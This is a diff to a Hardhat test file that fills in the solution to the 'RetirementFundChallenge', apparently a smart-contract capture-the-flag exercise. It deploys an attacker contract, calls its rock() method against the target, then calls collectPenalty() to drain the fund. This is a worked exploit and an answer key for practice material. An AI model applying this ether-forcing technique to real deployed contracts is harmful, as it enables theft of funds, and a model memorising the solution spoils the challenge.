@@ -6,6 +6,7 @@ const { utils } = ethers;
 
 describe('RetirementFundChallenge', () => {
   let target: Contract;
+  let attackerContract: Contract;
   let deployer: SignerWithAddress;
   let attacker: SignerWithAddress;
 
@@ -21,12 +22,15 @@ describe('RetirementFundChallenge', () => {
     await target.deployed();
 
     target = target.connect(attacker);
+
+    attackerContract = await (
+      await ethers.getContractFactory('RetirementFundChallengeAttacker', attacker)
+    ).deploy({ value: 1 });
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    await attackerContract.rock(target.address);
+    await target.collectPenalty();
 
     expect(await target.isComplete()).to.equal(true);
   });
